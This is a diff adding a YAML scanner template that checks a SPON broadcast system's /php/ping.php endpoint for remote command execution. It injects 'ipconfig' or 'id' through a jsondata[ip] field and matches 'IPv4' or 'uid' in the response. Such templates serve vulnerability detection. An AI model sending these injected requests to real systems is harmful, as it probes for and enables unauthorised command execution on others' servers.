@@ -1,0 +1,18 @@
+name: spon-broadcastsystem-rce
+groups:
+  windows:
+    - method: POST
+      path: "/php/ping.php"
+      body: 
+        "jsondata%5Btype%5D=99&jsondata%5Bip%5D=ipconfig"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'IPv4') 
+  linux:
+    - method: POST
+      path: "/php/ping.php"
+      body: 
+        "jsondata%5Btype%5D=99&jsondata%5Bip%5D=id"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'uid') 
+detail:
+  author: 666
